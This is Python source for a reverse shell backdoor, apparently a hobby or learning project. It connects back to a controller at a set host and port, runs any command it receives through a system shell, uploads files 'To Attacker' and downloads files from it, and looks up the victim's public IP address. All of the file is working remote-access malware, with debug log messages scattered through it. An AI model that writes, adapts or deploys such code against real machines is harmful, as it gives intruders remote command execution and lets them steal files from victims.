import socket
import time
import os
import subprocess
import json


def reliable_send(data):
	print("Sending Json Data")
	jsondata = json.dumps(data)
	s.send(jsondata.encode())

def reliable_recv():
	print("Recived Data")
	data = ""
	while True:
		try:
			print("Waiting For Cmd")
			data = data + s.recv(1024).decode().rstrip()
			print("command: " + data)
			print("Returning Data")
			return json.loads(data)
			print("Returned Json Data")
		except ValueError:
			continue
			print("Json Data Error")




def connection():
	while True:
		time.sleep(5)
		print("LOG: Trying To Connect")	
		try:
			s.connect((host, port))
			print("LOG: connected")
			shell()
		except:
			connection()

def upload_file(file_name):
			f = open(file_name, "rb")
			s.send(f.read())
			print("LOG: Sent File To Attacker")



def download_file(file_name):
			f = open(file_name, "wb")
			s.settimeout(1)
			chunk = s.recv(1024)
			while chunk:
				f.write(chunk)
				try:
					chunk = s.recv(1024)
				except socket.timeout as e:
					break
			s.settimeout(None)
			f.close()
			print("LOG: File Recived From Attacker")



def shell():
	while True:
		excecute = ""
		result = ""
		command = reliable_recv()
		if command == "quit":
			print("Server Has Stopped")
			os._exit(0)
		elif command[:3] == "cd ":
			os.chdir(command[3:])
		elif command == "clear":
			pass
		elif command[:8]=="download":
			upload_file(command[9:])
		elif command[:6]=="upload":
			download_file(command[7:])
		elif command=="help":
			pass
		elif command=="":
			pass
		elif command=="IP":
			result = os.popen('curl https://ipecho.net/plain ; echo').readlines(-1)[0].strip()
			print(result)
			print("decoded")
			reliable_send(result)
			print("sent data")
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			print("Executed Subprocess")
			print(execute)
			result = execute.stdout.read() + execute.stderr.read()
			print("Decoding")
			result = result.decode()
			print("Read Output")
			reliable_send(result)
			print("Reliable_Send = True")



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 1604
print("LOGS")
print("---------------")
print("LOG: Using IPv4 Succsesfully")
connection()
